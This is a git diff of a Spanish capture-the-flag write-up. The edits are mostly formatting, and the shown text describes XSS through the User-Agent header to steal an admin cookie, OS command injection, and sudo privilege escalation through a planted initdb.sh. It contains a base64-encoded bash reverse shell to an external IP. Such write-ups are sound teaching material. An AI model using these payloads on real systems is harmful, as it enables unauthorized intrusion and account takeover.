@@ -45,7 +45,7 @@ en el puerto 5000 hay un http corriendo en python.
 
  el sitio esta en construcción:
 
-![[web.png]]
+![web.png](Images/web.png)
 
 ### Ffuf
 
@@ -62,41 +62,39 @@ dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 
 
 Encuentra el directorio `support` y `dashboard`.
 
-dashboard:
+No tengo acceso al dashboard:
 
-No tengo acceso al directorio dashboard:
-
-![[unauth.png]]
+![unauth.png](Images/unauth.png)
 
 support:
 
 En support se encuentra un formulario para contactar con soporte:
 
-![[form.png]]
+![form.png](Images/form.png)
 
 # XSS
 
 uso las etiquetas `<h1>` para probar si es vulnerable a `xss`:
 
-![[xss.png]]
+![xss.png](Images/xss.png)
 
 Responde con el siguiente mensaje: 
 
-![[detect.png]]
+![detect.png](Images/detect.png)
 
-Dice que envía un reporte con los encabezados HTTP de mi navegador. 
+Dice que envía un reporte con la información de mi navegador, lo que envia son encabezados de una solicitud HTTP. 
 
 Como esa información también llega al administrador, intento probar el encabezado `User-Agent` para el `xss`:
 
-![[agent.png]]
+![agent.png](Images/agent.png)
 
 El payload se ejecuta correctamente:
 
-![[crab.png]]
+![crab.png](Images/crab.png)
 
  La cookie `is_admin` tiene la flag `HttpOnly` en false, por lo que puedo intentar robar la cookie del administrador y acceder al dashboard:
 
-![[cookie.png]]
+![cookie.png](Images/cookie.png)
 
 Agrego el siguiente payload al user-agent para recibir la cookie por una solicitud http que llegara a un servidor en que levantare con python:
 
@@ -122,23 +120,23 @@ root@kali /home/cangrejo/Escritorio/headless/Content # echo "ImFkbWluIg" | base6
 
 Reemplazo mi cookie por la del administrador y obtengo acceso al dashboard:
 
-![[dashboard.png]]
+![dashboard.png](Images/dashboard.png)
 
 Al hacer click muestra el mensaje `Systems are up and running!`
 
-![[report.png]]
+![report.png](Images/report.png)
 
-# os comand injection
+# OS comand injection
 
-No encontré ninguna pista de como puede estar generando el reporte, como usa python puede estar usando subprocess.run o os.system.
+No encontré ninguna pista de como puede estar generando el reporte, como usa python puede estar usando `subprocess.run` o `os.system`.
 
-Pruebo ejecutar el comando id colocando un `;`:
+En burpsuite pruebo ejecutar el comando id colocando un `;`:
 
-![[id.png]]
+![id.png](Images/id.png)
 
 y Funciona:
 
-![[idres.png]]
+![idres.png](Images/idres.png)
 
 # Shell como dvir
 
@@ -155,7 +153,7 @@ echo+"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDMgMD4mMQ%3d%3d"+|+base64+-
 
 Hace un `echo` de la revshell en b64, la decodifica con `base64 -d` y lo ejecuta con `bash`
 
-![[revshell.png]]
+![revshell.png](Images/revshell.png)
 
 Terminal en escucha:
 
@@ -233,11 +231,11 @@ exit 0
 
 Con pgrep verifica si initdb.sh se esta ejecutando, si no lo esta intenta ejecutarlo en el directorio actual.
 
-Ejecuto pgrep -x "initdb.sh" para verificar si se a iniciado, pero no muestra nada lo que no se esta ejecutando.
+Ejecuto pgrep -x "initdb.sh" para verificar si se a iniciado, pero no muestra nada, por lo que no se esta ejecutando.
 
 Como el script se ejecuta con sudo y busca `./initdb.sh`, puedo crear un script malicioso en el directorio actual y escalar privilegios.
 
-Creo un directorio `test` en `/tmp` el archivo initdb.sh con el siguiente comando:
+Creo un directorio `test` en `/tmp` y el archivo initdb.sh con el siguiente comando:
 
 ```
 #!/bin/bash
@@ -281,3 +279,5 @@ flag `root.txt`:
 cangrejo.sh-5.2# cat /root/root.txt 
 1c0a1323174*********************
 ```
+
+# 🦀
